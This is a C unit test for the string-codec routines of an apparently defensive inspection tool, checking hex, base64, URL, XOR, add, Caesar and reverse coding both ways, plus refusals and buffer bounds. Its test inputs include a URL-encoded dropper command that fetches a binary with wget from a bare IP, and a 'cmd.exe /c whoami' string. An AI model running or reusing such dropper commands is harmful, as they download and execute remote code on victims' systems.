/*
 * codec_forms - what each string coding means, both ways through it.
 *
 * The property under test is that the two directions are INVERSES, and it is
 * worth a test because they are written apart: kof_codec_run reads with one
 * pass and writes with another, and nothing at run time compares them. A
 * decoder that accepts what its encoder never produces is a box that looks
 * like it works until somebody round-trips a sample through it.
 *
 * The second property is the refusal. Zero means "this coding cannot do that" -
 * base64 given text that is not base64, hex given an odd number of digits - and
 * a caller shows it as an answer rather than an error, so a coding that
 * silently produced half a result would be reported as a decode.
 *
 * Nothing here touches the terminal: a coding is bytes in and bytes out, which
 * is why it lives in kofinspect and not in the dialog that started it.
 */

#include <stdio.h>
#include <string.h>

#include "../../kofexamine/kofinspect.h"

static int fails;

static void bad(const char *what, const char *why)
{
	printf("  FAIL %-22s %s\n", what, why);
	fails++;
}

/* `want` as text, or NULL to expect a refusal. */
static void one(const char *tag, uint32_t codec, uint32_t key, int encode,
		const char *in, const char *want)
{
	uint8_t out[512];
	uint32_t n = kof_codec_run((const uint8_t *)in, (uint32_t)strlen(in),
				   codec, key, encode, out, sizeof out);

	if (!want) {
		if (n)
			bad(tag, "produced something it should have refused");
		return;
	}
	if (n != strlen(want) || memcmp(out, want, n) != 0)
		printf("  FAIL %-22s got \"%.*s\" wanted \"%s\"\n",
		       tag, (int)n, (const char *)out, want), fails++;
}

/* Encode, then decode what came out, and expect the original back. */
static void round_trip(const char *tag, uint32_t codec, uint32_t key,
		       const char *text)
{
	uint8_t enc[512], dec[512];
	uint32_t n, m;

	n = kof_codec_run((const uint8_t *)text, (uint32_t)strlen(text),
			  codec, key, 1, enc, sizeof enc);
	if (!n) {
		bad(tag, "would not encode");
		return;
	}
	m = kof_codec_run(enc, n, codec, key, 0, dec, sizeof dec);
	if (m != strlen(text) || memcmp(dec, text, m) != 0)
		printf("  FAIL %-22s round trip gave \"%.*s\"\n",
		       tag, (int)m, (const char *)dec), fails++;
}

int main(void)
{
	uint32_t i;

	/* ---- what each one writes ---- */
	one("hex encode",    KOF_CODEC_HEX,    0, 1, "cmd.exe", "636D642E657865");
	one("hex decode",    KOF_CODEC_HEX,    0, 0, "636D642E657865", "cmd.exe");
	/* Lower case, and the separators a reader pastes in with it. */
	one("hex lower",     KOF_CODEC_HEX,    0, 0, "636d64", "cmd");
	one("hex spaced",    KOF_CODEC_HEX,    0, 0, "63 6d:64,", "cmd");
	one("b64 encode",    KOF_CODEC_B64,    0, 1, "cmd.exe", "Y21kLmV4ZQ==");
	one("b64 decode",    KOF_CODEC_B64,    0, 0, "Y21kLmV4ZQ==", "cmd.exe");
	one("b64 wrapped",   KOF_CODEC_B64,    0, 0, "Y21k\nLmV4ZQ==", "cmd.exe");
	/* The shape the norm view decodes: a dropper's command as a form
	 * body, where `+` is a space and the separators are spelled in hex. */
	one("url decode",    KOF_CODEC_URL,    0, 0,
	    "Cmd=wget+http%3A%2F%2F1.2.3.4%2Fmips",
	    "Cmd=wget http://1.2.3.4/mips");
	one("url encode",    KOF_CODEC_URL,    0, 1, "wget http://a/b",
	    "wget%20http%3A%2F%2Fa%2Fb");
	/* Lower case digits are read; only writing picks a case. */
	one("url lower",     KOF_CODEC_URL,    0, 0, "a%2fb", "a/b");
	/* 'c'^0x41 = 0x22, 'm'^0x41 = 0x2c, 'd'^0x41 = 0x25. */
	one("xor",           KOF_CODEC_XOR, 0x41, 0, "cmd", "\",%");
	one("reverse",       KOF_CODEC_REVERSE, 0, 1, "cmd", "dmc");
	one("caesar enc",    KOF_CODEC_CAESAR, 13, 1, "cmd", "pzq");
	one("caesar dec",    KOF_CODEC_CAESAR, 13, 0, "pzq", "cmd");
	/* Only letters move, which is what keeps a shifted command readable
	 * as a command. */
	one("caesar keeps punctuation",
	    KOF_CODEC_CAESAR, 13, 1, "cmd.exe", "pzq.rkr");

	/* ---- ADD's two directions are not the same pass ---- */
	one("add decode",    KOF_CODEC_ADD,    5, 0, "cmd", "hri");
	one("add encode",    KOF_CODEC_ADD,    5, 1, "hri", "cmd");

	/* ---- and every one of them round trips ---- */
	for (i = 0; i < (uint32_t)KOF_CODEC_COUNT; i++) {
		char tag[48];

		snprintf(tag, sizeof tag, "%s round trip", kof_codec_name(i));
		round_trip(tag, i, kof_codec_keyed(i) ? 7u : 0u,
			   "Process.Start(cmd.exe /c whoami)");
	}

	/* ---- what a coding REFUSES, which is an answer ---- */
	one("hex odd digit",  KOF_CODEC_HEX, 0, 0, "636D6", NULL);
	one("hex not hex",    KOF_CODEC_HEX, 0, 0, "zzzz", NULL);
	one("b64 not b64",    KOF_CODEC_B64, 0, 0, "not base64!", NULL);
	/* Text with no escape in it was not written this way, and a `%` that
	 * is not one says the same. */
	one("url no escape",  KOF_CODEC_URL, 0, 0, "cmd.exe", NULL);
	one("url bad escape", KOF_CODEC_URL, 0, 0, "a%zzb", NULL);
	one("url cut escape", KOF_CODEC_URL, 0, 0, "a%4", NULL);
	/* A shift of nothing is not a coding, in either direction. */
	one("caesar zero dec", KOF_CODEC_CAESAR, 0,  0, "cmd", NULL);
	one("caesar zero enc", KOF_CODEC_CAESAR, 26, 1, "cmd", NULL);
	one("not a coding",    KOF_CODEC_COUNT, 0,  0, "cmd", NULL);

	/* ---- the key as it is typed ---- */
	if (kof_codec_key("41") != 0x41u)
		bad("key", "plain hex");
	if (kof_codec_key("0x41") != 0x41u || kof_codec_key("0X41") != 0x41u)
		bad("key", "an 0x prefix");
	if (kof_codec_key("4g") != 0x4u)
		bad("key", "stops at the first character that is not a digit");
	if (kof_codec_key("") || kof_codec_key(NULL))
		bad("key", "nothing typed is not a key");

	/* ---- which ones have a key, said once ---- */
	if (!kof_codec_keyed(KOF_CODEC_XOR) ||
	    !kof_codec_keyed(KOF_CODEC_ADD) ||
	    !kof_codec_keyed(KOF_CODEC_CAESAR))
		bad("keyed", "a coding with a typed key says it has none");
	if (kof_codec_keyed(KOF_CODEC_B64) ||
	    kof_codec_keyed(KOF_CODEC_HEX) ||
	    kof_codec_keyed(KOF_CODEC_URL) ||
	    kof_codec_keyed(KOF_CODEC_REVERSE))
		bad("keyed", "a coding with no key says it has one");

	/* ---- the output bound is the caller's, and it is respected ---- */
	{
		uint8_t small[4];
		uint32_t n = kof_codec_run((const uint8_t *)"cmd.exe", 7u,
					   KOF_CODEC_HEX, 0, 1, small,
					   sizeof small);

		if (n > sizeof small)
			bad("cap", "wrote past the buffer it was given");
	}
	/* And nothing at all is not a call worth making. */
	{
		uint8_t one_byte[1];

		if (kof_codec_run(NULL, 4u, KOF_CODEC_HEX, 0, 0, one_byte, 1u))
			bad("cap", "read from a null input");
	}

	/* Every coding has a word, and the value past the end has one too. */
	for (i = 0; i <= (uint32_t)KOF_CODEC_COUNT; i++)
		if (!kof_codec_name(i) || !kof_codec_name(i)[0])
			bad("name", "a coding with no word for it");

	if (fails) {
		printf("codec forms: %d check(s) failed\n", fails);
		return 1;
	}
	printf("codec forms: hex, base64, url, xor, add, caesar, reverse - both "
	       "ways, round trips, refusals - ok\n");
	return 0;
}
